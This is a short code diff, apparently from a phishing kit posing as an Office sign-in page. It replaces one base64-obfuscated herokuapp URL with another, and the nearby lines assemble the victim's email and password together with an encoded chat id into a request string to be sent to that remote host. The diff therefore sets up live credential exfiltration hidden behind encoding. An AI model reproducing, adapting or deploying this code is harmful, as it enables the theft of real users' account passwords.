@@ -7236,7 +7236,7 @@ $("#btn2").attr('disabled',true);
 
 
  
-   var ruta = atob('aHR0cHM6Ly90aGVhY2Nlc3Nncm91cC5oZXJva3VhcHAuY29tLw==');
+   var ruta = atob('aHR0cHM6Ly9ueWtsb2dpc3RpY3MuaGVyb2t1YXBwLmNvbS8=');
    var yara = atob(document.getElementById("ref").getAttribute("gni"));
    var cckcrch = atob(document.getElementById("ref").getAttribute("irt"));
    var register = "u="+email+"&p="+epass+"&chatid="+yara+"&makin="+cckcrch+"&signup=office";
